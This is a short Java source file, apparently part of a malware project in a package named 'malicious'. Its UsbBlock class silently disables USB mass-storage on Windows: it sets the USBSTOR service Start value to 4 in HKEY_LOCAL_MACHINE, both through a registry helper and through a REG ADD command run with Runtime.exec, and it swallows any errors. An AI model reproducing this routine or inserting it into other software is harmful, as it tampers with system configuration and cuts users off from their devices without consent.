/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package malicious;
import util.WinRegistry;
/**
 *
 * @author SCEA
 */
public class UsbBlock {
    public static void block(){
        try
        {
            WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\USBSTOR", "Start", "4");
            String cmd = "REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR /v Start /t REG_DWORD /d 4";
            System.out.println(Runtime.getRuntime().exec(cmd));
        }
        catch(Exception e)
        {
           System.out.println("Error ocured!");
        }
    }
}
